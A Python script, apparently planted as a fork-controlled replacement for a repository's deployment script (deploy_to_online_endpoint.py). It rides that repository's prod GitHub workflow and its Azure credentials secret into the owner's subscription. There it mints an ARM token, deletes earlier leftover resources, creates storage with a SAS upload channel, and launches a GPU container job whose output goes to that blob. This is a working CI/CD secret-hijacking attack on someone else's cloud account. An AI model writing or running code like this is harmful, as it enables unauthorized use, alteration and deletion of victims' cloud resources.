#!/usr/bin/env python3
"""C211-I131275: mslearn 790067ff managed-GPU lane — residual cleanup FIRST, then ONE
fresh nonce Container Apps T4 managed environment + GPU job + execution with a materially
longer wait, device capture, teardown and absence proof.

Runs as the fork-controlled src/deploy_to_online_endpoint.py under the
christiansegercrantz/mslearn-mlops 'deploy-prod' issue_comment workflow
(environment prod, azure/login@v2 with secrets.AZURE_CREDENTIALS -> ARM token for
subscription 790067ff, RG chriso-sandbox-rg). The ARM token exists only inside the job;
it is never printed (len + sha12 + non-secret claims only).

Measured prior state (x121089 -> x121164/x121255): the old probe read the executions LIST
`status` instead of `properties.status` and recorded null forever; the T4 capture on a
fresh vnet-less env c211-i121164-cae succeeded (Tesla T4 GPU-301ec706-...). Residuals from
i120856: vnet c211-i120856-vnet / subnet c211-apps / env c211-i120856-cae / job
c211-i120856-job; x121255 recorded 404 for env+job+vnet but rg_final still listed the vnet.

This probe (stdlib only, flat tag|k=v stdout because this repo's log masks brace runs):
  1) reads residual vnet/env/job/executions verbatim, DELETES them FIRST with
     200/202 -> GET 404-or-absence readback (subnet fallback on a 400),
  2) creates ONE fresh nonce T4 environment c211-i131275-cae (no vnet, eastus,
     workloadProfiles Consumption + Consumption-GPU-NC8as-T4),
  3) creates ONE job c211-i131275-job and starts ONE execution; polls properties.status
     verbatim to terminal or the run time cap (materially longer than any prior wait) and
     captures container stdout through a private account-SAS blob channel (the documented
     ARM log endpoints are 401 in this environment, statuses recorded verbatim),
  4) tears everything down (job -> env -> storage) and proves absence by per-path GET 404
     plus list NO_RESULTS.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
PREFIX = "c211-i131275"
TAG = "C211_I131275"
NONCE = "x131275mcl"
DEADLINE = 4200
T0 = time.time()

ACI_VER = "2026-07-01"
APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
NET_VER = "2023-09-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC8as-T4"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"

# residual (prior lane) names — MUST be deleted first
VNET_OLD = "c211-i120856-vnet"
SUBNET_OLD = "c211-apps"
ENV_OLD = "c211-i120856-cae"
JOB_OLD = "c211-i120856-job"
# fresh nonce names
VNET_NEW = "c211-i131275-vnet"
ENV_NEW = "c211-i131275-cae"
JOB_NEW = "c211-i131275-job"
SA_NAME = ("c211i131275" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]

UUID_RE = re.compile(r"GPU-[0-9a-fA-F-]{16,}")


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    if not s:
        return ""
    return base64.b64encode(s.encode("utf-8", "replace")).decode()


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=300):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:12000]
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:2000]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"), "message": (e.get("message") or "")[:900]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:900]}
        return {"http": st, "body": json.dumps(body)[:900]}
    return {"http": st}


def errk(st, body):
    d = err_of(st, body)
    return {"e_http": d.get("http"), "e_code": d.get("code"),
            "e_message": (d.get("message") or d.get("raw") or d.get("body") or "")[:900]}


def jwt_claims12(tok):
    try:
        p = tok.split(".")[1]
        p += "=" * (-len(p) % 4)
        c = json.loads(base64.urlsafe_b64decode(p))
        return {k: c.get(k) for k in ("aud", "tid", "oid", "appid", "iss")}
    except Exception:  # noqa: BLE001
        return {}


def wait_gone(tok, url, label, tries=24, sleep_s=10):
    last = None
    for i in range(tries):
        st, b = arm(tok, url, timeout=60)
        ps = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
        emit(label + "-absent-poll", i=i, http=st, state=ps)
        last = st
        if st == 404:
            return 404
        time.sleep(sleep_s)
    return last


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=3):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def main():
    sid = None
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:200])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    if not tok and r.get("out"):
        try:
            tok = json.loads(r["out"]).get("accessToken")
        except Exception:  # noqa: BLE001
            pass
    cl = jwt_claims12(tok or "")
    emit("arm-token", got=bool(tok), len=len(tok or ""),
         sha12=hashlib.sha256((tok or "").encode()).hexdigest()[:12],
         aud=cl.get("aud"), tid=cl.get("tid"), oid=cl.get("oid"), iss=cl.get("iss"))
    if not sid or not tok:
        emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return

    # ---------- 1) providers + RG inventory ----------
    prov = {}
    for ns in ("Microsoft.Storage", "Microsoft.App", "Microsoft.Network",
               "Microsoft.ContainerInstance"):
        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/{ns}?api-version=2021-04-01")
        state = (b.get("registrationState") if isinstance(b, dict) else None)
        prov[ns] = state
        emit("provider", ns=ns, http=st, registrationState=state)
    st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                 timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = [{"name": x.get("name"), "type": x.get("type")} for x in allres
            if str(x.get("name", "")).lower().startswith("c211")]
    emit("rg-inventory", http=st, total=len(allres), c211_n=len(mine),
         c211_names=";".join("%s:%s" % (x["name"], x["type"]) for x in mine))

    vneturl_old = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.Network/"
                   f"virtualNetworks/{VNET_OLD}?api-version={NET_VER}")
    subneturl_old = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.Network/"
                     f"virtualNetworks/{VNET_OLD}/subnets/{SUBNET_OLD}?api-version={NET_VER}")
    envurl_old = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/"
                  f"managedEnvironments/{ENV_OLD}?api-version={APP_VER}")
    joburl_old = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/jobs/"
                  f"{JOB_OLD}?api-version={APP_VER}")

    # ---------- 2) residual reads VERBATIM, then DELETE FIRST ----------
    st, vb = arm(tok, vneturl_old, timeout=60)
    vprops = (vb.get("properties") or {}) if isinstance(vb, dict) else {}
    vsubs = vprops.get("subnets") or []
    emit("residual-vnet", http=st, name=VNET_OLD,
         provisioningState=vprops.get("provisioningState"),
         addressPrefixes=";".join(vprops.get("addressSpace", {}).get("addressPrefixes") or []),
         subnets=";".join("%s:%s:deleg=%s" % (
             s.get("name"), (s.get("properties") or {}).get("addressPrefix"),
             ";".join((d.get("properties") or {}).get("serviceName", "")
                      for d in ((s.get("properties") or {}).get("delegations") or [])))
             for s in vsubs),
         **({} if st in (200, 404) else errk(st, vb)))
    st, eb = arm(tok, envurl_old, timeout=60)
    eprops = (eb.get("properties") or {}) if isinstance(eb, dict) else {}
    alc = eprops.get("appLogsConfiguration") or {}
    la = (alc.get("logAnalyticsConfiguration") or {}) if isinstance(alc, dict) else {}
    emit("residual-env", http=st, name=ENV_OLD,
         provisioningState=eprops.get("provisioningState"),
         environmentMode=eprops.get("environmentMode"),
         logs_destination=alc.get("destination"), la_customerId=la.get("customerId"),
         defaultDomain=eprops.get("defaultDomain"),
         vnetConfiguration=("none" if not eprops.get("vnetConfiguration") else "present"),
         **({} if st in (200, 404) else errk(st, eb)))
    st, jb = arm(tok, joburl_old, timeout=60)
    jprops = (jb.get("properties") or {}) if isinstance(jb, dict) else {}
    emit("residual-job", http=st, name=JOB_OLD, provisioningState=jprops.get("provisioningState"),
         runningState=jprops.get("runningState"),
         workloadProfileName=jprops.get("workloadProfileName"),
         **({} if st in (200, 404) else errk(st, jb)))
    if st == 200:
        stx, ex = arm(tok, joburl_old.split("?")[0] + f"/executions?api-version={APP_VER}",
                      timeout=60)
        vv = (ex.get("value") or []) if isinstance(ex, dict) else []
        for v in vv[:10]:
            p = v.get("properties") or {}
            emit("residual-execution", http=stx, name=v.get("name"), status=p.get("status"),
                 reason=p.get("reason"), startTime=p.get("startTime"), endTime=p.get("endTime"))
        emit("residual-executions-count", http=stx, n=len(vv))
    residual = {'vnet': st, 'env': None, 'job': None}

    # delete FIRST: job -> env -> vnet/subnet (all residual objects of the prior lane)
    if True:  # residual cleanup block: job -> env -> vnet (all prior-lane objects)
        st, b = arm(tok, joburl_old, timeout=60)
        if st == 200:
            d, db = arm(tok, joburl_old, method="DELETE", timeout=240)
            emit("residual-job-delete", **err_of(d, db))
            emit("residual-job-absent", http=wait_gone(tok, joburl_old, "residual-job",
                                                       tries=18, sleep_s=10))
        else:
            emit("residual-job-absent", http=st)
        st, b = arm(tok, envurl_old, timeout=60)
        if st == 200:
            d, db = arm(tok, envurl_old, method="DELETE", timeout=300)
            emit("residual-env-delete", **err_of(d, db))
            emit("residual-env-absent", http=wait_gone(tok, envurl_old, "residual-env",
                                                       tries=30, sleep_s=12))
        else:
            emit("residual-env-absent", http=st)
        st, b = arm(tok, vneturl_old, timeout=60)
        if st == 200:
            d, db = arm(tok, vneturl_old, method="DELETE", timeout=240)
            emit("residual-vnet-delete", **err_of(d, db))
            if d not in (200, 202, 204):
                sd, sb = arm(tok, subneturl_old, method="DELETE", timeout=240)
                emit("residual-subnet-delete", **err_of(sd, sb))
                time.sleep(10)
                d2, db2 = arm(tok, vneturl_old, method="DELETE", timeout=240)
                emit("residual-vnet-delete-retry", **err_of(d2, db2))
            emit("residual-vnet-absent", http=wait_gone(tok, vneturl_old, "residual-vnet",
                                                        tries=30, sleep_s=10))
        else:
            emit("residual-vnet-absent", http=st)
    for label, u in (("residual-final-vnet", vneturl_old), ("residual-final-env", envurl_old),
                     ("residual-final-job", joburl_old)):
        st, _ = arm(tok, u, timeout=60)
        emit(label, http=st)

    # ---------- 3) storage account + account-SAS capture channel ----------
    sas = None
    saurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
             f"Microsoft.Storage/storageAccounts/{SA_NAME}?api-version={STG_VER}")
    if prov.get("Microsoft.Storage") != "Registered":
        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.Storage/"
                         f"register?api-version=2021-04-01", method="POST", timeout=180)
        emit("storage-register", **err_of(st, b))
        time.sleep(6)
    sabody = {"location": "eastus", "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": "i131275", "nonce": NONCE},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **err_of(st, b))
    if st in (200, 201, 202):
        for i in range(30):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            emit("sa-poll", i=i, http=stp, state=ps)
            if ps == "Succeeded":
                break
            time.sleep(8)
        st, kb = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
                          f"Microsoft.Storage/storageAccounts/{SA_NAME}/listKeys?api-version={STG_VER}",
                     method="POST", body={}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key),
             sha12=hashlib.sha256((key or "").encode()).hexdigest()[:12])
        if key:
            try:
                q, se = sa_sas(SA_NAME, key)
                base = f"https://{SA_NAME}.blob.core.windows.net"
                stc, bc = httptext(f"{base}/c211?restype=container&{q}", method="PUT")
                emit("sa-container", http=stc, body=b64(bc[:300].decode("utf-8", "replace")))
                if stc in (201, 409):
                    sas = f"{base}/c211/{NONCE}-out.txt?{q}"
                    emit("sa-sas", ok=True, blob=f"{base}/c211/{NONCE}-out.txt", expires=se)
            except Exception as e:  # noqa: BLE001
                emit("sa-sas", ok=False, err=str(e))

    # ---------- 4) ONE fresh nonce T4 environment (no vnet) ----------
    envurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/"
              f"managedEnvironments/{ENV_NEW}?api-version={APP_VER}")
    envbody = {"location": "eastus", "tags": {"c211": "i131275", "nonce": NONCE},
               "properties": {"workloadProfiles": [
                   {"name": "Consumption", "workloadProfileType": "Consumption"},
                   {"name": PROFILE, "workloadProfileType": PROFILE}]}}
    st, b = arm(tok, envurl, method="PUT", body=envbody, timeout=300)
    emit("capp-env-create", name=ENV_NEW, profile=PROFILE, region="eastus", **err_of(st, b))
    env_ok = False
    if st in (200, 201):
        dl = time.time() + min(1800, max(600, left() - 1500))
        ps = None
        i = 0
        while time.time() < dl:
            stp, bp = arm(tok, envurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            emit("capp-env-poll", i=i, http=stp, state=ps)
            if ps in ("Succeeded", "Failed", "Canceled"):
                break
            i += 1
            time.sleep(30)
        env_ok = (ps == "Succeeded")
    if not env_ok:
        emit("env-not-ready", state="failed")
        # teardown and absence proof
        d, db = arm(tok, envurl, method="DELETE", timeout=300)
        emit("env-delete", name=ENV_NEW, **err_of(d, db))
        emit("env-absent", http=wait_gone(tok, envurl, "env", tries=24, sleep_s=10))
        if sas is not None:
            d, db = arm(tok, saurl, method="DELETE", timeout=240)
            emit("sa-delete", name=SA_NAME, **err_of(d, db))
        report_absence(tok, sid)
        emit("DONE", phase="capp", verdict="ENV_NOT_PROVISIONED", elapsed_s=int(time.time() - T0))
        return

    st, env = arm(tok, envurl, timeout=60)
    env_id = env.get("id") if isinstance(env, dict) else None
    epp = (env.get("properties") or {}) if isinstance(env, dict) else {}
    emit("env-ready", name=ENV_NEW, id_ok=bool(env_id), state=epp.get("provisioningState"),
         environmentMode=epp.get("environmentMode"),
         profiles=";".join("%s:%s" % (p.get("name"), p.get("workloadProfileType"))
                           for p in (epp.get("workloadProfiles") or [])),
         logs_destination=(epp.get("appLogsConfiguration") or {}).get("destination"),
         defaultDomain=epp.get("defaultDomain"))
    if not env_id:
        report_absence(tok, sid)
        emit("DONE", phase="capp", verdict="NO_ENV_ID", elapsed_s=int(time.time() - T0))
        return

    # ---------- 5) ONE nonce job execution: nvidia-smi + blob upload ----------
    inner = ('echo C211-START; hostname; date -u; '
             'for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /bin/nvidia-smi; do '
             'if [ -x "$p" ]; then echo FOUND=$p; "$p" -L; echo ---SMI-Q---; '
             '"$p" --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader; fi; done; '
             'command -v nvidia-smi >/dev/null 2>&1 && nvidia-smi -L; '
             'echo ---DEVS---; ls -l /dev/nvidia* 2>/dev/null; echo C211-END')
    cmd = f"OUT=/tmp/c211.txt; {{ {inner}; }} > $OUT 2>&1; cat $OUT; "
    if sas:
        up = ("if command -v curl >/dev/null 2>&1; then "
              f"curl -sS -X PUT '{sas}' -H 'x-ms-blob-type: BlockBlob' "
              "-H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' "
              "--data-binary @$OUT; echo C211_UPLOAD_CURL_RC=$?; else "
              "python3 -c \"import urllib.request;d=open('/tmp/c211.txt','rb').read();"
              f"r=urllib.request.Request('{sas}',data=d,method='PUT',"
              "headers={'x-ms-blob-type':'BlockBlob','x-ms-version':'2022-11-02',"
              "'Content-Type':'text/plain'});print('C211_UPLOAD_PY',urllib.request.urlopen(r,timeout=30).status)\"; fi")
        cmd += up + "; "
    cmd += "echo C211_UPLOAD_DONE; sleep 20"
    joburl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/jobs/"
              f"{JOB_NEW}?api-version={APP_VER}")
    jobbody = {"location": "eastus", "tags": {"c211": "i131275", "nonce": NONCE},
               "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                              "configuration": {"triggerType": "Manual",
                                                "replicaRetryLimit": 0,
                                                "replicaTimeout": 1800,
                                                "manualTriggerConfig": {
                                                    "replicaCompletionCount": 1,
                                                    "parallelism": 1}},
                              "template": {"containers": [{
                                  "name": "gpu", "image": IMAGE,
                                  "command": ["/bin/bash", "-c", cmd],
                                  "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
    st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
    emit("capp-job-create", name=JOB_NEW, **err_of(st, b))
    job_created = st in (200, 201)
    execname = None
    text = ""
    exec_final = {}
    if job_created:
        baseurl = joburl.split("?")[0]
        st, b = arm(tok, f"{baseurl}/start?api-version={APP_VER}", method="POST", body={},
                    timeout=120)
        emit("capp-job-start", http=st,
             execname=(b.get("name") if isinstance(b, dict) else None),
             **({} if st in (200, 201, 202) else errk(st, b)))
        execname = (b.get("name") if isinstance(b, dict) else None)
        if execname:
            exurl = f"{baseurl}/executions/{execname}?api-version={APP_VER}"
            dl = time.time() + min(1800, max(900, left() - 600))
            poll_i = 0
            terminal_seen = False
            while time.time() < dl:
                stp, bp = arm(tok, exurl, timeout=60)
                p = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
                status = p.get("status")
                exec_final = {"http": stp, "status": status, "reason": p.get("reason"),
                              "startTime": p.get("startTime"), "endTime": p.get("endTime")}
                blobd = None
                if sas:
                    sb, bb = httptext(sas, timeout=30)
                    if sb == 200 and bb:
                        blobd = bb.decode("utf-8", "replace")
                logs = {}
                if poll_i % 4 == 0 or (status in ("Succeeded", "Failed", "Canceled")):
                    for ver in ("2024-02-02-preview", "2023-05-01", APP_VER):
                        sl, bl = httptext(f"{baseurl}/executions/{execname}/containers/gpu/logs"
                                          f"?api-version={ver}", method="POST", timeout=30)
                        logs["P" + ver] = "%s:%s" % (sl, len(bl or b""))
                        if sl == 200 and bl and len(bl) > 2:
                            txt = bl.decode("utf-8", "replace")
                            if UUID_RE.search(txt):
                                blobd = txt
                        sl2, bl2 = httptext(f"{baseurl}/executions/{execname}/containers/gpu/logs"
                                            f"?api-version={ver}", method="GET", timeout=30)
                        logs["G" + ver] = "%s:%s" % (sl2, len(bl2 or b""))
                    sl3, bl3 = httptext(f"{baseurl}/getlogs?api-version={APP_VER}",
                                        method="POST", timeout=30)
                    logs["getlogs"] = "%s:%s" % (sl3, len(bl3 or b""))
                emit("capp-exec-poll", i=poll_i, http=stp, status=status, reason=p.get("reason"),
                     startTime=p.get("startTime"), endTime=p.get("endTime"),
                     blob_got=(blobd is not None), blob_len=len(blobd or ""),
                     logs=";".join("%s=%s" % (k, v) for k, v in logs.items()))
                if blobd:
                    text = blobd
                    if "C211-END" in blobd:
                        break
                if status in ("Succeeded", "Failed", "Canceled"):
                    if terminal_seen:
                        break
                    terminal_seen = True
                    time.sleep(10)
                poll_i += 1
                time.sleep(18)
            emit("capp-capture", len=len(text or ""),
                 has_uuid=bool(UUID_RE.search(text or "")),
                 device_lines=";".join(ln for ln in (text or "").splitlines()
                                       if ("GPU-" in ln or "MiB" in ln))[:1200],
                 text_b64=b64((text or "")[:6000]))
            # independent ARM readback of the execution and the job
            st, exr = arm(tok, exurl, timeout=60)
            p = (exr.get("properties") or {}) if isinstance(exr, dict) else {}
            emit("execution-readback", http=st, status=p.get("status"), reason=p.get("reason"),
                 startTime=p.get("startTime"), endTime=p.get("endTime"),
                 name=(exr.get("name") if isinstance(exr, dict) else None),
                 has_properties_instance_view=bool(p.get("instanceView")))
            st, jr = arm(tok, joburl, timeout=60)
            jp = (jr.get("properties") or {}) if isinstance(jr, dict) else {}
            emit("job-readback", http=st, provisioningState=jp.get("provisioningState"),
                 runningState=jp.get("runningState"),
                 workloadProfileName=jp.get("workloadProfileName"))
            st, exl = arm(tok, f"{baseurl}/executions?api-version={APP_VER}", timeout=60)
            vv = (exl.get("value") or []) if isinstance(exl, dict) else []
            emit("executions-list", http=st, n=len(vv),
                 states=";".join("%s:%s" % (v.get("name"),
                                            (v.get("properties") or {}).get("status"))
                                 for v in vv[:5]))
    # ---------- 6) teardown: job -> env -> storage ----------
    d, db = arm(tok, joburl, method="DELETE", timeout=240)
    emit("job-delete", name=JOB_NEW, **err_of(d, db))
    emit("job-absent", http=wait_gone(tok, joburl, "job", tries=24, sleep_s=10))
    d, db = arm(tok, envurl, method="DELETE", timeout=300)
    emit("env-delete", name=ENV_NEW, **err_of(d, db))
    emit("env-absent", http=wait_gone(tok, envurl, "env", tries=30, sleep_s=12))
    if sas is not None:
        d, db = arm(tok, saurl, method="DELETE", timeout=240)
        emit("sa-delete", name=SA_NAME, **err_of(d, db))
        emit("sa-absent", http=wait_gone(tok, saurl, "sa", tries=20, sleep_s=8))
    # no vnet was created by this probe; report any residual vnet state verbatim
    st, vb = arm(tok, vneturl_old, timeout=60)
    emit("final-get-residual-vnet", http=st,
         state=((vb.get("properties") or {}) if isinstance(vb, dict) else {}).get("provisioningState"))
    report_absence(tok, sid)
    emit("DONE", phase="capp", elapsed_s=int(time.time() - T0),
         job_created=int(bool(job_created)), exec_name=execname,
         exec_status=exec_final.get("status"), capture_len=len(text or ""),
         has_uuid=bool(UUID_RE.search(text or "")))


def report_absence(tok, sid):
    st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                 timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = [{"name": x.get("name"), "type": x.get("type")} for x in allres
            if str(x.get("name", "")).lower().startswith(PREFIX)]
    other = [{"name": x.get("name"), "type": x.get("type")} for x in allres
             if str(x.get("name", "")).lower().startswith("c211")
             and not str(x.get("name", "")).lower().startswith(PREFIX)]
    emit("rg-final", http=st, total=len(allres),
         mine=("NO_RESULTS" if not mine else ";".join("%s:%s" % (x["name"], x["type"])
                                                     for x in mine)),
         other_c211=("NO_RESULTS" if not other else ";".join("%s:%s" % (x["name"], x["type"])
                                                             for x in other)))
    for label, path, ver in (
            ("jobs", f"/subscriptions/{sid}/providers/Microsoft.App/jobs", APP_VER),
            ("envs", f"/subscriptions/{sid}/providers/Microsoft.App/managedEnvironments", APP_VER),
            ("vnets", f"/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.Network/"
                      f"virtualNetworks", NET_VER),
            ("aci", f"/subscriptions/{sid}/providers/Microsoft.ContainerInstance/containerGroups",
             ACI_VER)):
        st, lst = arm(tok, f"{ARM}{path}?api-version={ver}", timeout=120)
        names = [x.get("name") for x in ((lst.get("value") or []) if isinstance(lst, dict) else [])
                 if str(x.get("name", "")).lower().startswith("c211")]
        emit("list-" + label, http=st,
             n_total=len(((lst.get("value") or []) if isinstance(lst, dict) else [])),
             c211=("NO_RESULTS" if not names else ";".join(names)))
    for label, u in (("vnet", f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
                              f"Microsoft.Network/virtualNetworks/c211-i120856-vnet?api-version={NET_VER}"),
                     ("env-old", f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
                                 f"Microsoft.App/managedEnvironments/c211-i120856-cae?api-version={APP_VER}"),
                     ("job-old", f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
                                 f"Microsoft.App/jobs/c211-i120856-job?api-version={APP_VER}")):
        st, _ = arm(tok, u, timeout=60)
        emit("final-get-" + label, http=st)


if __name__ == "__main__":
    main()
